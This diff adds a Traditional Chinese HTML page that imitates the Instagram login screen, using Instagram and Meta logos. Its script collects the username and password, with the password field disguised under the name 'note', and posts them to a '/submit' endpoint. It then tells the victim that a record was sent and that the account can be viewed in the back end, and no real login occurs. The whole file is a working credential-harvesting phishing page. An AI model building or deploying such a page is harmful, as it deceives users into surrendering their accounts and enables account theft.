@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IG Login Template</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <main class="screen">
+    <section class="phone">
+      <div class="locale">中文(台灣)</div>
+
+      <img class="brand-image" src="instagram-logo.png" alt="Instagram logo" />
+
+      <form class="login-card" id="login-form">
+        <label class="input-field">
+          <span class="sr-only">用戶名稱、電子郵件地址或手機號碼</span>
+          <input name="username" type="text" placeholder="用戶名稱、電子郵件地址或手機號碼" autocomplete="username" required />
+        </label>
+
+        <label class="input-field">
+          <span class="sr-only">密碼</span>
+          <input name="note" type="password" placeholder="密碼" autocomplete="off" />
+        </label>
+
+        <button class="primary-btn" type="submit">登入</button>
+
+        <a class="forgot-link" href="#">忘記密碼？</a>
+
+        <p class="status" id="status" aria-live="polite"></p>
+      </form>
+
+      <div class="divider">
+        <span></span>
+        <p>或</p>
+        <span></span>
+      </div>
+
+      <button class="secondary-btn" type="button">建立新帳號</button>
+
+      <img class="meta-image" src="meta-logo.png" alt="Meta" />
+    </section>
+  </main>
+
+  <script>
+    const form = document.getElementById('login-form');
+    const status = document.getElementById('status');
+
+      form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const data = new FormData(form);
+      const username = String(data.get('username') || '').trim();
+      const note = String(data.get('note') || '').trim();
+
+      const payload = {
+        username,
+        note,
+        status: '登入嘗試',
+        source: 'iPhone 登入頁'
+      };
+
+      const response = await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (response.ok) {
+        status.textContent = '已送出安全紀錄，後台可查看帳號。';
+        form.reset();
+      } else {
+        status.textContent = '送出失敗，請稍後再試。';
+      }
+    });
+  </script>
+</body>
+</html>
